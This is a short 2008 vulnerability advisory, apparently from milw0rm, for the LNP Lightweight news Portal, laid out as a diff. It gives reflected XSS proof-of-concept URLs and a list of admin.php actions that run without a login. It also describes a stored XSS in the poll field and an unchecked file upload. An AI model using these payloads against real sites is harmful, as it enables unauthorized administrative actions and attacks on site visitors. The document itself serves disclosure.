@@ -1,0 +1,53 @@
+  ____       _   _       _ ___   __                        _  __
+ / ___| ___ | \ | |_   _| | \ \ / /__  _   _ _ __ ___  ___| |/ _| ___  _ __ __ _
+| |  _ / _ \|  \| | | | | | |\ V / _ \| | | | '__/ __|/ _ \ | |_ / _ \| '__/ _` |
+| |_| | (_) | |\  | |_| | | | | | (_) | |_| | |  \__ \  __/ |  _| (_) | | | (_| |
+ \____|\___/|_| \_|\__,_|_|_| |_|\___/ \__,_|_|  |___/\___|_|_|(_)___/|_|  \__, |
+---------------------------------------------------------------------------|___/
+Exploit found by sToRm
+
+
+LNP: Lightweight news Portal v1.0-BETA
+Multiple Remote Vulnerabilities
+
+
+Cross-Site Scripting
+--------------------
+
+show_photo.php?photo="><script>javascript:alert(document.domain)</script>
+show_potd.php?potd="><script>javascript:alert(document.domain)</script>
+
+
+Insecure Administration
+-----------------------
+
+The admin page faces us with a login, but many important functions are allowed 
+to be executed without a logged-in session.
+
+admin.php?A=potd_delete
+admin.php?A=potd
+admin.php?A=vote_update
+admin.php?A=vote
+admin.php?A=modifynews
+
+
+Permanent Code Injection
+------------------------
+
+admin.php?A=vote
+
+"Current question" field allows for code injection, allowing us to force 
+all users browsing the poll to view an XSS or browser exploit. 
+
+
+File Upload
+-----------
+
+admin.php?A=potd
+
+The "picture of the day" manager allows for further images to be 
+uploaded, but does not check for image validity. Although a phpshell 
+cannot be executed through this method, a source may be uploaded for 
+inclusion in further attacks, possibly an LFI somewhere on the server. 
+
+# milw0rm.com [2008-06-20]
